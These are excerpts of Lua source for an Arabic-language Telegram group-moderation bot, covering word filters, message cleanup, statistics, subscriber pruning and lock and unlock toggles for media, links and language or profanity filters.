Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
AliNight:del(Night.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
AliNight:hdel(Night..'Abs:Filters:'..msg.chat_id_, text)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙الكلمه ↫ "..text.." تم الغاء منعها", 1, 'html')
AliNight:del(Night.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
...
local gps = AliNight:scard(Night.."Abs:Groups") local users = AliNight:scard(Night.."Abs:Users") 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙احصائيات البوت ↫ ⤈\n✯︙عدد المشتركين ↫ ❨ '..users..' ❩\n✯︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
...
if Number > 5000 then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لاتستطيع تنظيف اكثر من 5000 رساله', 1, 'md')
return false  
end  
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
AliNight:setex(Night..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
...
AliNight:srem(Night.."Abs:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙*لا يوجد مشتركين وهميين*', 1, 'md')
else
local ok = #pv - sendok
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙عدد المشتركين الان ↫ { '..#pv..' }\n✯︙تم حذف ↫ { '..sendok..' } من المشتركين\n✯︙العدد الحقيقي الان  ↫ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
...
local group = AliNight:smembers(Night.."Abs:Groups")
local w = 0
local q = 0
for i = 1, #group do
...
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = Night, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
...
if #group == i then 
if (w + q) == 0 then
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙*لاتوجد مجموعات وهميه*', 1, 'md')   
else
local Nightgp2 = (w + q)
local Nightgp3 = #group - Nightgp2
if q == 0 then
Nightgp2 = ''
else
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:Lock:CleanNum'..msg.chat_id_,true)  
end
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:Lock:CleanNum'..msg.chat_id_) 
end
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙قم بتحديد عدد اكبر من 10 واصغر من 1000 للحذف التلقائي', 1, 'md')
else
...
if msg and AliNight:get(Night..'Abs:Lock:CleanNum'..msg.chat_id_) then
...
if AliNight:scard(Night.."Abs:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = AliNight:smembers(Night.."Abs:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
AliNight:del(Night.."Abs:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if AliNight:get(Night..'Abs:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = AliNight:scard(Night.."Abs:cleanernum"..msg.chat_id_)
if M ~= 0 then
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل مسح الاغاني بنجاح'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if AliNight:get(Night..'Abs:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = AliNight:scard(Night.."Abs:cleanermusic"..msg.chat_id_)
if M ~= 0 then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙عدد الاغاني ↫ "..M, 1, 'md') 
else
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙لاتوجد اغاني هنا", 1, 'md') 
end end
if text == "مسح الاغاني" or text == "تنظيف الاغاني" or text == "حذف الاغاني" then
local List = AliNight:smembers(Night.."Abs:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
if Del ~= 0 then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حذف "..Del.." من الاغاني", 1, 'md') 
AliNight:del(Night.."Abs:cleanermusic"..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم تنظيف 100 من الرسائل المعدله', 1, 'md')
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
...
AliNight:del(Night..'Abs:Lock:EditMsgs'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙التعديل بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if AbsConstructor(msg) then
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
if UnLockText[2] == "الفارسيه" then
if AliNight:get(Night..'Abs:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الفارسيه")  
AliNight:del(Night..'Abs:Lock:Farsi'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفشار" then
if not AliNight:get(Night..'Abs:Lock:Fshar'..msg.chat_id_) then
...
if not AliNight:get(Night..'Abs:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الطائفيه")  
AliNight:set(Night..'Abs:Lock:Taf'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكفر" then
if not AliNight:get(Night..'Abs:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الكفر")  
AliNight:set(Night..'Abs:Lock:Kfr'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الكفر بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفارسيه بالطرد" then
if AliNight:get(Night..'Abs:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الفارسيه بالطرد")  
AliNight:del(Night..'Abs:Lock:FarsiBan'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
end
end
if AbsConstructor(msg) then
...
AliNight:del(Night.."Abs:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
AliNight:hdel(Night.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if AliNight:get(Night..'Abs:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح التثبيت")  
AliNight:del(Night..'Abs:Lock:Pin'..msg.chat_id_)
AliNight:srem(Night.."Abs:Lock:Pinpin",msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
end end end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if not AliNight:get(Night..'Abs:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الدردشه")  
AliNight:set(Night..'Abs:Lock:Text'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الدردشه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاونلاين" then
if not AliNight:get(Night..'Abs:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الاونلاين")  
AliNight:set(Night..'Abs:Lock:Inline'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصور" then
if not AliNight:get(Night..'Abs:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الصور")  
AliNight:set(Night..'Abs:Lock:Photo'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الصور بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكلايش" then
if not AliNight:get(Night..'Abs:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الكلايش")  
AliNight:set(Night..'Abs:Lock:Spam'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الكلايش بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الدخول" then
if not AliNight:get(Night..'Abs:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الدخول")  
AliNight:set(Night..'Abs:Lock:Join'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الدخول بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفيديو" then
if not AliNight:get(Night..'Abs:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الفيديو")  
AliNight:set(Night..'Abs:Lock:Videos'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الفيديو بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "المتحركه" then
if not AliNight:get(Night..'Abs:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل المتحركه")  
AliNight:set(Night..'Abs:Lock:Gifs'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙المتحركه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاغاني" then
if not AliNight:get(Night..'Abs:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الاغاني")  
AliNight:set(Night..'Abs:Lock:Music'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الاغاني بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصوت" then
if not AliNight:get(Night..'Abs:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الصوت")  
AliNight:set(Night..'Abs:Lock:Voice'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الصوت بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الروابط" then
if not AliNight:get(Night..'Abs:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الروابط")  
AliNight:set(Night..'Abs:Lock:Links'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الروابط بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المواقع" then
if not AliNight:get(Night..'Abs:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل المواقع")  
AliNight:set(Night..'Abs:Lock:Location'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙المواقع بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
if not AliNight:get(Night..'Abs:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل المعرفات")  
AliNight:set(Night..'Abs:Lock:Tags'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙المعرفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملفات" then
if not AliNight:get(Night..'Abs:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الملفات")  
AliNight:set(Night..'Abs:Lock:Document'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الملفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
if not AliNight:get(Night..'Abs:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الهاشتاك")  
AliNight:set(Night..'Abs:Lock:Hashtak'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الجهات" then
if not AliNight:get(Night..'Abs:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الجهات")  
AliNight:set(Night..'Abs:Lock:Contact'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '️✯︙الجهات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الشبكات" then
if not AliNight:get(Night..'Abs:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الشبكات")  
AliNight:set(Night..'Abs:Lock:WebLinks'..msg.chat_id_,true) 
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الشبكات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "العربيه" then
if not AliNight:get(Night..'Abs:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل العربيه")  
AliNight:set(Night..'Abs:Lock:Arabic'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العربيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الانكليزيه" then
if not AliNight:get(Night..'Abs:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الانكليزيه")  
AliNight:set(Night..'Abs:Lock:English'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الانكليزيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملصقات" then
if not AliNight:get(Night..'Abs:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الملصقات")  
AliNight:set(Night..'Abs:Lock:Stickers'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الملصقات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الماركداون" then
if not AliNight:get(Night..'Abs:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الماركداون")  
AliNight:set(Night..'Abs:Lock:Markdown'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الماركداون بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاشعارات" then
if not AliNight:get(Night..'Abs:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الاشعارات")  
AliNight:set(Night..'Abs:Lock:TagServr'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "التوجيه" then
if not AliNight:get(Night..'Abs:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل التوجيه")  
AliNight:set(Night..'Abs:Lock:Forwards'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙التوجيه بالفعل مقفل في المجموعه', 1, 'md')
end
end
end
end
...
AliNight:del(Night..'Abs:Lock:Text'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصور" then
if AliNight:get(Night..'Abs:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الصور")  
AliNight:del(Night..'Abs:Lock:Photo'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if AliNight:get(Night..'Abs:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الكلايش")  
AliNight:del(Night..'Abs:Lock:Spam'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الدخول" then
if AliNight:get(Night..'Abs:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الدخول")  
AliNight:del(Night..'Abs:Lock:Join'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الدخول بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفيديو" then
if AliNight:get(Night..'Abs:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الفيديو")  
AliNight:del(Night..'Abs:Lock:Videos'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملفات" then
if AliNight:get(Night..'Abs:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الملفات")  
AliNight:del(Night..'Abs:Lock:Document'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاونلاين" then
if AliNight:get(Night..'Abs:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الاونلاين")  
AliNight:del(Night..'Abs:Lock:Inline'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الماركداون" then
if AliNight:get(Night..'Abs:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الماركداون")  
AliNight:del(Night..'Abs:Lock:Markdown'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المتحركه" then
if AliNight:get(Night..'Abs:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح المتحركه")  
AliNight:del(Night..'Abs:Lock:Gifs'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاغاني" then
if AliNight:get(Night..'Abs:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الاغاني")  
AliNight:del(Night..'Abs:Lock:Music'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصوت" then
if AliNight:get(Night..'Abs:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الصوت")  
AliNight:del(Night..'Abs:Lock:Voice'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الروابط" then
if AliNight:get(Night..'Abs:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الروابط")  
AliNight:del(Night..'Abs:Lock:Links'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المواقع" then
if AliNight:get(Night..'Abs:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح المواقع")  
AliNight:del(Night..'Abs:Lock:Location'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
if AliNight:get(Night..'Abs:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح المعرفات")  
AliNight:del(Night..'Abs:Lock:Tags'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙المعرفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
if AliNight:get(Night..'Abs:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الهاشتاك")  
AliNight:del(Night..'Abs:Lock:Hashtak'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الجهات" then
if AliNight:get(Night..'Abs:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الجهات")  
AliNight:del(Night..'Abs:Lock:Contact'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الشبكات" then
if AliNight:get(Night..'Abs:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الشبكات")  
AliNight:del(Night..'Abs:Lock:WebLinks'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "العربيه" then
if AliNight:get(Night..'Abs:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح العربيه")  
AliNight:del(Night..'Abs:Lock:Arabic'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الانكليزيه" then
if AliNight:get(Night..'Abs:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الانكليزيه")  
AliNight:del(Night..'Abs:Lock:English'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الانكليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاشعارات" then
if AliNight:get(Night..'Abs:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الاشعارات")  
AliNight:del(Night..'Abs:Lock:TagServr'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملصقات" then
if AliNight:get(Night..'Abs:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح الملصقات")  
AliNight:del(Night..'Abs:Lock:Stickers'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التوجيه" then
if AliNight:get(Night..'Abs:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم فتح التوجيه")  
AliNight:del(Night..'Abs:Lock:Forwards'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
end
...
AliNight:set(Night.."Abs:Lock:Bots"..msg.chat_id_,"del") AliNight:hset(Night.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Abs:Lock:Links','Abs:Lock:Contact','Abs:Lock:Forwards','Abs:Lock:Videos','Abs:Lock:Gifs','Abs:Lock:EditMsgs','Abs:Lock:Stickers','Abs:Lock:Farsi','Abs:Lock:Spam','Abs:Lock:WebLinks','Abs:Lock:Photo'}
for i,Lock in pairs(LockList) do
AliNight:set(Night..Lock..msg.chat_id_,true)
end
...
AliNight:del(Night..'Abs:Lock:Fshar'..msg.chat_id_) AliNight:del(Night..'Abs:Lock:Taf'..msg.chat_id_) AliNight:del(Night..'Abs:Lock:Kfr'..msg.chat_id_) 
AliNight:set(Night.."Abs:Lock:Bots"..msg.chat_id_,"del") AliNight:hset(Night.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Abs:Lock:EditMsgs','Abs:Lock:Farsi','Abs:Lock:TagServr','Abs:Lock:Inline','Abs:Lock:Photo','Abs:Lock:Spam','Abs:Lock:Videos','Abs:Lock:Gifs','Abs:Lock:Music','Abs:Lock:Voice','Abs:Lock:Links','Abs:Lock:Location','Abs:Lock:Tags','Abs:Lock:Stickers','Abs:Lock:Markdown','Abs:Lock:Forwards','Abs:Lock:Document','Abs:Lock:Contact','Abs:Lock:Hashtak','Abs:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
AliNight:set(Night..Lock..msg.chat_id_,true)
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙اختر عدد اكبر من 40 حرف ', 1, 'md')
else
AliNight:set(Night..'Abs:Spam:Text'..msg.chat_id_,SetSpam)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم وضع عدد السبام ↫'..SetSpam, 1, 'md')
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙صلاحيات البوت هي ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n✯︙حذف الرسائل ↫ '..DEL..'\n✯︙دعوة المستخدمين ↫ '..INV..'\n✯︙حظر المستخدمين ↫ '..BAN..'\n✯︙تثبيت الرسائل ↫ '..PIN..'\n✯︙تغيير المعلومات ↫ '..EDT..'\n✯︙اضافة مشرفين ↫ '..VIP..'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
end end
if text and text:match("^تغير رد المطور (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المطور (.*)$") 
AliNight:set(Night.."Abs:SudoBot:Rd"..msg.chat_id_,Text)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم تغير رد المطور الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
AliNight:set(Night.."Abs:BasicConstructor:Rd"..msg.chat_id_,Text)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم تغير رد المنشئ الاساسي الى ↫ "..Text, 1, 'md')
